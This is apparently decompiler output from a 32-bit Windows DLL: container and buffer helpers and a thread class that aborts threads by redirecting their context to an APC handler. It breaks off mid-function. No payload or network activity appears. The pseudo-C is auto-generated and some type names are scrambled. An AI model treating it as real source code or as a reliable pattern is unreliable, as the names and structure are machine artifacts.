int *__usercall sub_100130E8@<eax>(int *a1@<eax>, int *a2@<edi>)
{
  int v2; // eax
  int v3; // ebx

  v2 = *a1;
  v3 = *a2;
  if ( *a2 != v2 )
  {
    *a2 = v2;
    sub_10012CDF(a2);
    if ( v3 )
      sub_1000B119(v3);
  }
  return a2;
}

//----- (1001310B) --------------------------------------------------------
_DWORD *__thiscall sub_1001310B(_DWORD *Block, char a2)
{
  sub_1001312A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001312A) --------------------------------------------------------
void __thiscall sub_1001312A(_DWORD *this)
{
  bool v2; // cf
  int (__thiscall **pExceptionObject)(void *, char); // [esp+8h] [ebp-Ch] BYREF
  char v4; // [esp+Ch] [ebp-8h]
  int v5; // [esp+10h] [ebp-4h]

  v2 = this[2] < 0x32u;
  *this = off_10102700;
  if ( !v2 )
    ExitThread(0);
  if ( *((_BYTE *)this + 4) && !__uncaught_exception() && !sub_1000E758() )
  {
    v5 = this[2] + 1;
    pExceptionObject = off_10102700;
    v4 = 1;
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__);
  }
}
// 10102700: using guessed type int (__thiscall *off_10102700[2])(void *Block, char);

//----- (10013181) --------------------------------------------------------
_BYTE *__thiscall sub_10013181(_BYTE *this, int a2)
{
  _BYTE *result; // eax

  result = this;
  *(_DWORD *)this = off_10102700;
  this[4] = *(_BYTE *)(a2 + 4);
  *((_DWORD *)this + 2) = *(_DWORD *)(a2 + 8);
  return result;
}
// 10102700: using guessed type int (__thiscall *off_10102700[2])(void *Block, char);

//----- (1001319F) --------------------------------------------------------
LPVOID sub_1001319F()
{
  LPVOID result; // eax

  result = TlsGetValue(dword_10182DE0);
  if ( !result )
    return (LPVOID)sub_10015C1C();
  return result;
}

//----- (100131B5) --------------------------------------------------------
int __stdcall sub_100131B5(int a1)
{
  sub_10012621((_DWORD *)a1, 0, 0);
  *(_DWORD *)a1 = &off_101026A0;
  sub_1001EC12(a1 + 12);
  *(_DWORD *)(a1 + 48) = &off_10102704;
  sub_100144E2((_DWORD *)(a1 + 52));
  *(_DWORD *)(a1 + 100) = 0;
  *(_DWORD *)(a1 + 8) = -1;
  *(_DWORD *)(a1 + 88) = 0;
  *(_DWORD *)(a1 + 92) = 0;
  *(_BYTE *)(a1 + 96) = 0;
  return a1;
}
// 101026A0: using guessed type int (__thiscall *off_101026A0)(void *Block, char);
// 10102704: using guessed type int (__thiscall *off_10102704)(void *Block, char);

//----- (10013225) --------------------------------------------------------
int *__thiscall sub_10013225(int *Block, char a2)
{
  sub_10013553(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10013244) --------------------------------------------------------
void __stdcall pfnAPC(ULONG_PTR Parameter)
{
  volatile LONG *v1; // eax
  int (__thiscall **pExceptionObject)(void *, char); // [esp+0h] [ebp-Ch] BYREF
  char v3; // [esp+4h] [ebp-8h]
  int v4; // [esp+8h] [ebp-4h]

  v1 = (volatile LONG *)sub_1001319F();
  if ( !v1 )
    goto LABEL_2;
  if ( (unsigned int)InterlockedIncrement(v1 + 25) <= 1 )
  {
    if ( !__uncaught_exception() && !sub_1000E758() )
    {
      v4 = 0;
      pExceptionObject = off_10102700;
      v3 = 1;
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__);
    }
LABEL_2:
    ExitThread(0);
  }
}
// 10102700: using guessed type int (__thiscall *off_10102700[2])(void *Block, char);

//----- (1001329C) --------------------------------------------------------
void *__thiscall sub_1001329C(int this, int a2)
{
  _DWORD *v3; // eax
  int v4; // eax
  void *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  void *v8; // eax
  void *v9; // eax
  _DWORD *v10; // eax
  BOOL v12; // [esp+Ch] [ebp-304h] BYREF
  _DWORD *v13[2]; // [esp+10h] [ebp-300h] BYREF
  int v14[3]; // [esp+18h] [ebp-2F8h] BYREF
  int v15[3]; // [esp+24h] [ebp-2ECh] BYREF
  CONTEXT Context; // [esp+30h] [ebp-2E0h] BYREF
  int v17; // [esp+30Ch] [ebp-4h]

  sub_1000EDE4((int *)(this + 12), v13);
  v17 = 0;
  if ( *(_DWORD *)(this + 88) != 3 )
  {
    v3 = sub_1000E7F7(&v12, 1, 0);
    LOBYTE(v17) = 1;
    sub_10007882((int)v3);
  }
  sub_1001364B((int *)this);
  v17 = -1;
  sub_1000EDA4(v13);
  *(_BYTE *)(this + 96) = 1;
  memset(&Context.Dr0, 0, 0x2C8u);
  v4 = *(_DWORD *)this;
  Context.ContextFlags = 65599;
  v5 = (void *)(*(int (__thiscall **)(int))(v4 + 76))(this);
  if ( !GetThreadContext(v5, &Context) )
  {
    sub_100136F6((int *)this);
    v6 = sub_1000E9DF(v14, 1, 1);
    v17 = 2;
    sub_1000A947(v6, 127);
  }
  v7 = *(_DWORD *)this;
  Context.Eip = (DWORD)pfnAPC;
  v8 = (void *)(*(int (__thiscall **)(int))(v7 + 76))(this);
  v12 = SetThreadContext(v8, &Context);
  sub_100136F6((int *)this);
  v9 = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)this + 76))(this);
  QueueUserAPC(pfnAPC, v9, 0);
  PostThreadMessageA(*(_DWORD *)(this + 8), 0, 0, 0);
  if ( !v12 )
  {
    v10 = sub_1000E9DF(v15, 1, 1);
    v17 = 3;
    sub_1000A947(v10, 164);
  }
  sub_10012EAB(this, a2, 0);
  *(_DWORD *)(this + 88) = 7;
  return sub_100139F2((_DWORD *)this);
}
// 1001329C: using guessed type int var_2F8[3];
// 1001329C: using guessed type int var_2EC[3];

//----- (10013406) --------------------------------------------------------
int __thiscall sub_10013406(unsigned int *this)
{
  int v2; // eax
  _DWORD *v3; // eax
  bool v4; // zf
  void (__thiscall **v5)(unsigned int *, uintptr_t, _DWORD); // edi
  uintptr_t v6; // eax
  _DWORD *v8; // eax
  int v9[3]; // [esp+Ch] [ebp-28h] BYREF
  _DWORD *v10[2]; // [esp+18h] [ebp-1Ch] BYREF
  int v11; // [esp+20h] [ebp-14h] BYREF
  int v12; // [esp+24h] [ebp-10h] BYREF
  int v13; // [esp+30h] [ebp-4h]

  sub_1000EDE4((int *)this + 3, v10);
  v13 = 0;
  v2 = this[22];
  if ( v2 == 4 )
  {
    v3 = sub_1000E7F7(&v12, 1, 0);
    LOBYTE(v13) = 1;
    goto LABEL_3;
  }
  if ( v2 && v2 < 5 )
  {
    v3 = sub_1000E7F7(&v11, 1, 0);
    LOBYTE(v13) = 2;
LABEL_3:
    sub_10007882((int)v3);
  }
  v4 = this[25] == 0;
  *((_BYTE *)this + 96) = 0;
  if ( !v4 )
  {
    while ( InterlockedDecrement((volatile LONG *)this + 25) )
      ;
  }
  v5 = (void (__thiscall **)(unsigned int *, uintptr_t, _DWORD))(*this + 12);
  v6 = _beginthreadex(0, 0, (_beginthreadex_proc_type)StartAddress, this, 0, this + 2);
  (*v5)(this, v6, 0);
  if ( !(*(int (__thiscall **)(unsigned int *))(*this + 76))(this)
    || (*(int (__thiscall **)(unsigned int *))(*this + 76))(this) == -1 )
  {
    (*(void (__thiscall **)(unsigned int *, int, _DWORD))(*this + 12))(this, -1, 0);
    v8 = sub_1000E9DF(v9, 1, 1);
    LOBYTE(v13) = 3;
    sub_1000A947(v8, 193);
  }
  this[22] = 1;
  v13 = -1;
  return sub_1000EDA4(v10);
}
// 10013406: using guessed type int var_28[3];

//----- (100134FD) --------------------------------------------------------
int __thiscall sub_100134FD(int *this)
{
  int v2; // edi
  int v3; // eax
  _DWORD *v5[2]; // [esp+8h] [ebp-14h] BYREF
  int v6; // [esp+18h] [ebp-4h]

  sub_1000EDE4(this + 3, v5);
  v6 = 0;
  v2 = (*(int (__thiscall **)(int *))(*this + 8))(this);
  v3 = *this;
  this[22] = 4;
  (*(void (__thiscall **)(int *, int, _DWORD))(v3 + 12))(this, -1, 0);
  v6 = -1;
  sub_1000EDA4(v5);
  return v2;
}

//----- (10013553) --------------------------------------------------------
void __thiscall sub_10013553(int *this)
{
  _DWORD v2[5]; // [esp+0h] [ebp-20h] BYREF
  int v3; // [esp+1Ch] [ebp-4h]

  v2[4] = v2;
  v2[3] = this;
  *this = (int)&off_101026A0;
  v3 = 3;
  if ( this[22] != 4 )
    sub_10013931(this, 0);
  v3 = 1;
  sub_10014334(this + 12);
  LOBYTE(v3) = 0;
  sub_1001ECA1(this + 3);
  v3 = -1;
  sub_10012679(this);
}
// 101026A0: using guessed type int (__thiscall *off_101026A0)(void *Block, char);

//----- (100135CE) --------------------------------------------------------
int __thiscall sub_100135CE(_DWORD *this)
{
  return this[22];
}

//----- (100135D2) --------------------------------------------------------
int __thiscall sub_100135D2(_DWORD *this)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  v3[0] = this;
  if ( this[22] != 6 )
  {
    v1 = sub_1000E7F7(v3, 1, 0);
    v3[3] = 0;
    sub_10007882((int)v1);
  }
  return this[23];
}

//----- (1001360D) --------------------------------------------------------
int __thiscall sub_1001360D(_DWORD *this)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  v3[0] = this;
  if ( this[22] == 4 )
  {
    v1 = sub_1000E7F7(v3, 1, 0);
    v3[3] = 0;
    sub_10007882((int)v1);
  }
  return *(_DWORD *)(this[1] + 16);
}

//----- (1001364B) --------------------------------------------------------
int __thiscall sub_1001364B(int *this)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v6; // [esp+8h] [ebp-28h] BYREF
  _DWORD *v7[2]; // [esp+Ch] [ebp-24h] BYREF
  int v8[4]; // [esp+14h] [ebp-1Ch] BYREF
  int v9; // [esp+2Ch] [ebp-4h]

  sub_1000EDE4(this + 3, v7);
  v9 = 0;
  v2 = this[22];
  if ( !v2 )
  {
    v3 = sub_1000E9DF(v8, 1, 1);
    LOBYTE(v9) = 1;
    sub_1000A947(v3, 250);
  }
  if ( v2 == 4 )
  {
    v4 = sub_1000E7F7(&v6, 1, 0);
    LOBYTE(v9) = 2;
    sub_10007882((int)v4);
  }
  if ( v2 <= 3 )
  {
    sub_10012974(this);
    this[22] = 2;
  }
  v9 = -1;
  return sub_1000EDA4(v7);
}
// 1001364B: using guessed type int var_1C[4];

//----- (100136F6) --------------------------------------------------------
char __thiscall sub_100136F6(int *this)
{
  char v2; // bl
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v7; // [esp+10h] [ebp-28h] BYREF
  _DWORD *v8[2]; // [esp+14h] [ebp-24h] BYREF
  int v9[4]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v10; // [esp+34h] [ebp-4h]

  sub_1000EDE4(this + 3, v8);
  v2 = 0;
  v10 = 0;
  v3 = this[22];
  if ( !v3 )
  {
    v4 = sub_1000E9DF(v9, 1, 1);
    LOBYTE(v10) = 1;
    sub_1000A947(v4, 269);
  }
  if ( v3 == 4 )
  {
    v5 = sub_1000E7F7(&v7, 1, 0);
    LOBYTE(v10) = 2;
    sub_10007882((int)v5);
  }
  if ( v3 > 3 )
    goto LABEL_6;
  if ( sub_10012837(this) )
  {
    this[22] = 3;
    v2 = 1;
LABEL_6:
    v10 = -1;
    sub_1000EDA4(v8);
    return v2;
  }
  v10 = -1;
  sub_1000EDA4(v8);
  return 0;
}
// 100136F6: using guessed type int var_1C[4];

//----- (100137BD) --------------------------------------------------------
void __thiscall sub_100137BD(int *this, int a2, char a3)
{
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7; // [esp+8h] [ebp-28h] BYREF
  _DWORD *v8[2]; // [esp+Ch] [ebp-24h] BYREF
  int v9[4]; // [esp+14h] [ebp-1Ch] BYREF
  int v10; // [esp+2Ch] [ebp-4h]

  if ( this[22] < 5 )
  {
    sub_1000EDE4(this + 3, v8);
    v10 = 0;
    v4 = this[22];
    if ( !v4 )
    {
      v5 = sub_1000E9DF(v9, 1, 1);
      LOBYTE(v10) = 1;
      sub_1000A947(v5, 298);
    }
    if ( v4 == 4 )
    {
      v6 = sub_1000E7F7(&v7, 1, 0);
      LOBYTE(v10) = 2;
      sub_10007882((int)v6);
    }
    v10 = -1;
    if ( v4 < 5 )
    {
      sub_1000EDA4(v8);
      sub_10012EAB((int)this, a2, a3);
    }
    else
    {
      sub_1000EDA4(v8);
    }
  }
}
// 100137BD: using guessed type int var_1C[4];

//----- (10013882) --------------------------------------------------------
void *__thiscall sub_10013882(int this, DWORD dwExitCode)
{
  _DWORD *v3; // eax
  void *result; // eax
  int v5; // [esp+0h] [ebp-2Ch] BYREF
  _DWORD *v6[2]; // [esp+Ch] [ebp-20h] BYREF
  _DWORD v7[3]; // [esp+14h] [ebp-18h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  v7[2] = &v5;
  v7[1] = this;
  v8 = 0;
  sub_1000EDE4((int *)(this + 12), v6);
  LOBYTE(v8) = 1;
  if ( *(_DWORD *)(this + 88) == 4 )
  {
    v3 = sub_1000E7F7(v7, 1, 0);
    LOBYTE(v8) = 2;
    sub_10007882((int)v3);
  }
  LOBYTE(v8) = 0;
  sub_1000EDA4(v6);
  v8 = -1;
  result = *(void **)(this + 88);
  if ( result == (void *)3 || result == (void *)2 || result == (void *)1 )
  {
    sub_1001535A(*(void **)(this + 8), 0);
    sub_100126F0((_DWORD *)this, dwExitCode);
    result = sub_100139F2((_DWORD *)this);
    *(_DWORD *)(this + 88) = 7;
  }
  return result;
}

//----- (10013931) --------------------------------------------------------
void *__thiscall sub_10013931(_DWORD *this, int a2)
{
  _DWORD *v3; // eax
  void *result; // eax
  int v5; // [esp+0h] [ebp-2Ch] BYREF
  _DWORD *v6[3]; // [esp+Ch] [ebp-20h] BYREF
  char v7; // [esp+1Bh] [ebp-11h]
  int *v8; // [esp+1Ch] [ebp-10h]
  int v9; // [esp+28h] [ebp-4h]

  v8 = &v5;
  v6[2] = this;
  sub_1000EDE4(this + 3, v6);
  v9 = 0;
  if ( this[22] == 4 )
  {
    v3 = sub_1000E7F7(&a2, 1, 0);
    LOBYTE(v9) = 1;
    sub_10007882((int)v3);
  }
  v9 = -1;
  sub_1000EDA4(v6);
  v7 = 0;
  result = (void *)this[22];
  if ( result == (void *)3 || result == (void *)2 || result == (void *)1 )
  {
    v9 = 2;
    if ( this[22] == 3 )
    {
      sub_1001329C((int)this, 5000);
      v7 = 1;
    }
    v9 = -1;
    if ( !v7 )
      (*(void (__thiscall **)(_DWORD *, int))(*this + 84))(this, a2);
    return sub_100139F2(this);
  }
  return result;
}

//----- (100139F2) --------------------------------------------------------
void *__thiscall sub_100139F2(_DWORD *this)
{
  _DWORD *v1; // edi
  unsigned int v2; // ebx
  _DWORD *v3; // esi
  int v5; // [esp+10h] [ebp-20h] BYREF
  unsigned int v6; // [esp+14h] [ebp-1Ch]
  int i; // [esp+2Ch] [ebp-4h]

  v1 = this + 12;
  (*(void (__thiscall **)(_DWORD *, int *))(this[12] + 16))(this + 12, &v5);
  v2 = 0;
  for ( i = 0; v2 < v6; ++v2 )
  {
    v3 = *(_DWORD **)(*(int (__thiscall **)(int *, unsigned int))(v5 + 44))(&v5, v2);
    sub_1001EE5B(v3);
  }
  (*(void (__thiscall **)(_DWORD *))(*v1 + 28))(v1);
  i = -1;
  return sub_10013CFA((int)&v5);
}

//----- (10013A71) --------------------------------------------------------
unsigned int __stdcall StartAddress(int *lpTlsValue)
{
  int v2; // [esp+0h] [ebp-34h] BYREF
  void (__cdecl *v3[3])(unsigned int, struct _EXCEPTION_POINTERS *); // [esp+Ch] [ebp-28h] BYREF
  _DWORD *v4[4]; // [esp+18h] [ebp-1Ch] BYREF
  int v5; // [esp+30h] [ebp-4h]

  v4[3] = &v2;
  v5 = 0;
  sub_1000EA57((int)v3);
  LOBYTE(v5) = 1;
  sub_1000E73C();
  if ( !TlsSetValue(dword_10182DE0, lpTlsValue) )
    sub_10015C59();
  sub_1000EDE4(lpTlsValue + 3, v4);
  LOBYTE(v5) = 2;
  if ( lpTlsValue[22] != 4 )
    lpTlsValue[22] = 3;
  LOBYTE(v5) = 1;
  sub_1000EDA4(v4);
  lpTlsValue[23] = (*(int (__thiscall **)(int *))(*lpTlsValue + 92))(lpTlsValue);
  sub_1000EDE4(lpTlsValue + 3, v4);
  LOBYTE(v5) = 3;
  if ( lpTlsValue[22] != 4 )
    lpTlsValue[22] = 6;
  LOBYTE(v5) = 1;
  sub_1000EDA4(v4);
  LOBYTE(v5) = 0;
  sub_1000EA95(v3);
  return 0;
}
// 10015C59: using guessed type void __noreturn sub_10015C59(void);
// 10013A71: using guessed type void (__cdecl *var_28[3])(unsigned int, struct _EXCEPTION_POINTERS *);

//----- (10013C34) --------------------------------------------------------
_DWORD *__thiscall sub_10013C34(void *this, _DWORD *a2, _DWORD *a3)
{
  unsigned int v4; // eax
  _DWORD *v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  v5 = a3;
  if ( (unsigned int)a3 > v4 )
  {
    v6 = sub_1000E8EF(&a3);
    sub_100078FE((int)v6);
  }
  v7 = operator new(0xCu);
  a3 = v7;
  if ( v7 )
  {
    v7[1] = this;
    *v7 = &off_101023F8;
    v7[2] = v5;
  }
  else
  {
    v7 = 0;
  }
  sub_10050B91(a2, (int)v7);
  return a2;
}
// 101023F8: using guessed type int (__thiscall *off_101023F8)(void *Block, char);

//----- (10013CBE) --------------------------------------------------------
int __thiscall sub_10013CBE(int this)
{
  _DWORD *v2; // eax
  int v4; // [esp-4h] [ebp-8h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                   *(_DWORD *)(this + 4) + 4,
                   *(_DWORD *)(this + 20));
  v4 = *(_DWORD *)(this + 20);
  *(_DWORD *)(this + 12) = *v2;
  *(_BYTE *)(this + 16) = *(_BYTE *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                                      *(_DWORD *)(this + 4) + 20,
                                      v4);
  return this + 8;
}

//----- (10013CEC) --------------------------------------------------------
void __thiscall sub_10013CEC(_DWORD *this)
{
  --this[5];
}

//----- (10013CF0) --------------------------------------------------------
BOOL __thiscall sub_10013CF0(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10013CFA) --------------------------------------------------------
void *__thiscall sub_10013CFA(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10102728;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_100185A9((_DWORD *)this);
}
// 10102728: using guessed type int (__thiscall *off_10102728)(void *Block, char);

//----- (10013D58) --------------------------------------------------------
int __thiscall sub_10013D58(_DWORD *this, int *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  int v9; // [esp+14h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1014012E);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = v9;
  ++this[1];
  return result;
}

//----- (10013DBB) --------------------------------------------------------
int __thiscall sub_10013DBB(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1014012F);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10013E07) --------------------------------------------------------
int __thiscall sub_10013E07(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10140166);
  return this[3] + 4 * a2;
}

//----- (10013E28) --------------------------------------------------------
int __thiscall sub_10013E28(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10140167);
  return this[3] + 4 * a2;
}

//----- (10013E49) --------------------------------------------------------
void __thiscall sub_10013E49(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (10013E6E) --------------------------------------------------------
unsigned int __thiscall sub_10013E6E(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101401B6);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10013EE0) --------------------------------------------------------
void **__thiscall sub_10013EE0(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (10013F22) --------------------------------------------------------
void *__thiscall sub_10013F22(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_101027C0;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_100185A9((_DWORD *)this);
}
// 101027C0: using guessed type int (__thiscall *off_101027C0)(void *Block, char);

//----- (10013F80) --------------------------------------------------------
int __thiscall sub_10013F80(_DWORD *this, char *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  char v9; // [esp+17h] [ebp+Fh]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_101401B7);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_BYTE *)(i + this[3]) = *(_BYTE *)(i + this[3] - 1);
  result = this[3];
  *(_BYTE *)(a3 + result) = v9;
  ++this[1];
  return result;
}

//----- (10013FE2) --------------------------------------------------------
int __thiscall sub_10013FE2(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1014032A);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_BYTE *)(v2 + this[3]) = *(_BYTE *)(v2 + this[3] + 1);
    ++v2;
  }
  *(_BYTE *)((*(int (__thiscall **)(_DWORD *))(*this + 4))(this) + this[3]) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1001402D) --------------------------------------------------------
int __thiscall sub_1001402D(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1014032B);
  return a2 + this[3];
}

//----- (1001404B) --------------------------------------------------------
int __thiscall sub_1001404B(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1014043A);
  return a2 + this[3];
}

//----- (10014069) --------------------------------------------------------
int __thiscall sub_10014069(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_BYTE *)(i + this[3]) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (100140AB) --------------------------------------------------------
unsigned int __thiscall sub_100140AB(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v7; // edx
  int *v8; // ecx
  unsigned int v9; // [esp+18h] [ebp+Ch]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1014043B);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v9 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v9 >= a2 )
      {
        v7 = *a4;
        v8 = a4;
      }
      else
      {
        v7 = *a3;
        v8 = a3;
      }
      (*(void (__thiscall **)(int *, unsigned int))(v7 + 36))(v8, v9 + this[3]);
      ++v9;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v9 < result );
  }
  return result;
}

//----- (1001411E) --------------------------------------------------------
unsigned int __stdcall sub_1001411E(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10014131) --------------------------------------------------------
unsigned int __thiscall sub_10014131(_DWORD *this, int a2, int a3, int a4)
{
  size_t v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_BYTE *)(v6 + this[3]) = *(_BYTE *)(v6 + a3);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (10014181) --------------------------------------------------------
void __thiscall sub_10014181(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  _BYTE *v6; // ebx
  int v7; // eax
  _BYTE *v8; // edi
  _BYTE *Block; // [esp+Ch] [ebp-Ch]
  int Size; // [esp+10h] [ebp-8h]
  unsigned int v11; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      Size = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      Size = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    Block = (_BYTE *)this[3];
    v11 = 0;
    v6 = operator new(Size);
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v7 = Block - v6;
      v8 = v6;
      while ( 1 )
      {
        ++v11;
        *v8 = v8[v7];
        ++v8;
        if ( v11 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
        v7 = Block - v6;
      }
    }
    this[3] = v6;
    j__free(Block);
    this[2] = Size;
  }
}

//----- (1001422D) --------------------------------------------------------
void *__thiscall sub_1001422D(_DWORD *this)
{
  *this = &off_10102784;
  sub_10013F22((int)(this + 5));
  sub_10013CFA((int)(this + 1));
  return sub_100185A9(this);
}
// 10102784: using guessed type int (__thiscall *off_10102784)(void *Block, char);

//----- (10014277) --------------------------------------------------------
int __thiscall sub_10014277(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // edi
  int v4; // esi
  int v5; // eax

  v2 = a2;
  v4 = sub_1003F0D1(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
